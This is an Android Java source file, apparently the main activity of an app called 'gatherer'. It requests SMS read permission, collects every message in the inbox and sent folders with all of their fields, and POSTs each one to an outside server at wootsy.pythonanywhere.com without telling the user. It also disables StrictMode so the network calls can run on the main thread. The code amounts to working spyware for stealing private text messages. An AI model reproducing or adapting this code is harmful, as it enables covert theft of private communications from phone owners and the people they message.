package com.example.alex.gatherer;

import android.Manifest;
import android.content.pm.PackageManager;
import android.net.Uri;
import android.os.Bundle;
import android.os.StrictMode;
import android.support.design.widget.FloatingActionButton;
import android.support.design.widget.Snackbar;
import android.support.v4.content.ContextCompat;
import android.support.v7.app.AppCompatActivity;
import android.support.v7.widget.Toolbar;
import android.view.View;
import android.view.Menu;
import android.view.MenuItem;
import android.database.Cursor;

import com.example.alex.gatherer.R;

import java.io.DataOutputStream;
import java.io.IOException;
import java.io.OutputStreamWriter;
import java.io.PrintWriter;
import java.net.HttpURLConnection;
import java.net.URL;
import java.net.URLConnection;
import java.util.ArrayList;
import java.util.List;

public class MainActivity extends AppCompatActivity {

    private static final int READ_TEXTS_PERMISSIONS_REQUEST = 1;



    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        setContentView(R.layout.activity_main);
        Toolbar toolbar = (Toolbar) findViewById(R.id.toolbar);
        setSupportActionBar(toolbar);



        // request text access
        requestPermissions(new String[]{Manifest.permission.READ_SMS},
                READ_TEXTS_PERMISSIONS_REQUEST);


    }

    @Override
    public void onRequestPermissionsResult(int requestCode,
                                           String permissions[], int[] grantResults) {
        switch (requestCode) {
            case READ_TEXTS_PERMISSIONS_REQUEST: {
                // If request is cancelled, the result arrays are empty.
                if (grantResults.length > 0
                        && grantResults[0] == PackageManager.PERMISSION_GRANTED) {

                    // array of all texts
                    List<String> texts = new ArrayList<>();

                    // inbox cursor
                    Cursor cursor = getContentResolver().query(Uri.parse("content://sms/inbox"), null, null, null, null);

                    if (cursor.moveToFirst()) { // must check the result to prevent exception
                        do {
                            String msgData = "";
                            for(int idx=0;idx<cursor.getColumnCount();idx++)
                            {
                                msgData += " " + cursor.getColumnName(idx) + ":" + cursor.getString(idx);
                            }
                            texts.add(msgData);
                        } while (cursor.moveToNext());
                    } else {
                        System.out.println("No messages found");
                    }
                    cursor.close();

                    // sent cursor
                    cursor = getContentResolver().query(Uri.parse("content://sms/sent"), null, null, null, null);
                    if (cursor.moveToFirst()) { // must check the result to prevent exception
                        do {
                            String msgData = "";
                            for(int idx=0;idx<cursor.getColumnCount();idx++)
                            {
                                msgData += " " + cursor.getColumnName(idx) + ":" + cursor.getString(idx);
                            }
                            texts.add(msgData);
                        } while (cursor.moveToNext());
                    } else {
                        System.out.println("No messages found");
                    }
                    cursor.close();

                    for (String t : texts) {
                        sentToServer(t);
                    }

                } else {

                    // permission denied, boo! Disable the
                    // functionality that depends on this permission.
                }

                return;
            }

            // other 'case' lines to check for other
            // permissions this app might request
        }
    }


    public void sentToServer(String msg) {
        try {

            StrictMode.ThreadPolicy policy = new StrictMode.ThreadPolicy.Builder()
                    .permitAll().build();
            StrictMode.setThreadPolicy(policy);
            String toSend = msg;
            String urlParameters = "message=" + toSend;
            String request = "http://wootsy.pythonanywhere.com";
            URL url = new URL(request);

            HttpURLConnection connection = (HttpURLConnection) url.openConnection();
            connection.setDoOutput(true);
            connection.setDoInput(true);
            connection.setInstanceFollowRedirects(false);
            connection.setRequestMethod("POST");
            connection.setRequestProperty("Content-Type", "application/x-www-form-urlencoded");
            connection.setRequestProperty("charset", "utf-8");
            connection.setRequestProperty("Content-Length", "" + Integer.toString(urlParameters.getBytes().length));
            connection.setUseCaches(false);

            DataOutputStream wr = new DataOutputStream(connection.getOutputStream());
            wr.writeBytes(urlParameters);
            connection.getInputStream();
            wr.flush();
            wr.close();
            connection.disconnect();

        } catch(Exception e) {
            e.printStackTrace();
        }

    }

    @Override
    public boolean onCreateOptionsMenu(Menu menu) {
        // Inflate the menu; this adds items to the action bar if it is present.
        getMenuInflater().inflate(R.menu.menu_main, menu);
        return true;
    }

    @Override
    public boolean onOptionsItemSelected(MenuItem item) {
        // Handle action bar item clicks here. The action bar will
        // automatically handle clicks on the Home/Up button, so long
        // as you specify a parent activity in AndroidManifest.xml.
        int id = item.getItemId();

        //noinspection SimplifiableIfStatement
        if (id == R.id.action_settings) {
            return true;
        }

        return super.onOptionsItemSelected(item);
    }
}
